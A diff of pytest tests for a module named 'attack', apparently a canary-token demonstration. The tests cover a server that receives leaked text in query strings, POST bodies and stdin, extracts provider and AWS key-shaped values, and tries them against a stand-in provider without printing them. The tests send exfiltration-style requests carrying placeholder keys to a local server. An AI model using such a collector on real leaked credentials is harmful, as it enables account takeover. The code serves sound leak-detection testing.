@@ -84,6 +84,41 @@ def test_present_uses_whoami_and_bearer_with_no_session_proof():
     assert not any(k.lower() == "x-burn-session-proof" for k in seen["headers"])
 
 
+def test_extract_keys_finds_a_url_encoded_leak():
+    # %3D decodes to '=', so the raw text has a hex digit right before the prefix;
+    # extract_keys must url-decode to still find it (a form POST / --data-urlencode).
+    assert attack.extract_keys(f"contents=PROVIDER_API_KEY%3D{CANARY_SHAPED}") == [CANARY_SHAPED]
+    assert attack.extract_keys(f"a={AWS_SHAPED}&b=x") == [AWS_SHAPED]
+
+
+def test_received_text_includes_the_query_string():
+    text = attack.received_text(f"/audit?contents={CANARY_SHAPED}", f"body {AWS_SHAPED}")
+    assert attack.extract_keys(text) == [AWS_SHAPED, CANARY_SHAPED]
+
+
+def test_handler_prints_no_token_even_in_the_query_string(capsys):
+    import http.client
+    import threading
+
+    server = attack.make_server(0, "http://provider.example", present=lambda u, t: "refused")
+    port = server.server_address[1]
+    worker = threading.Thread(target=server.handle_request, daemon=True)  # serve exactly one request
+    worker.start()
+    try:
+        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
+        # a token in the query string, and another in the body
+        conn.request("POST", f"/audit?contents=PROVIDER_API_KEY%3D{CANARY_SHAPED}",
+                     body=f"AWS_ACCESS_KEY_ID={AWS_SHAPED}")
+        conn.getresponse().read()
+        conn.close()
+    finally:
+        worker.join(5)
+        server.server_close()
+    out = capsys.readouterr().out
+    assert CANARY_SHAPED not in out and AWS_SHAPED not in out  # no value, even from the query
+    assert "provider key" in out and "aws key" in out  # both were still found and tried
+
+
 def test_reads_leaked_text_from_stdin(monkeypatch):
     import io
     monkeypatch.setattr("sys.stdin", io.StringIO(f"here is the backup\nPROVIDER_API_KEY={CANARY_SHAPED}\n"))
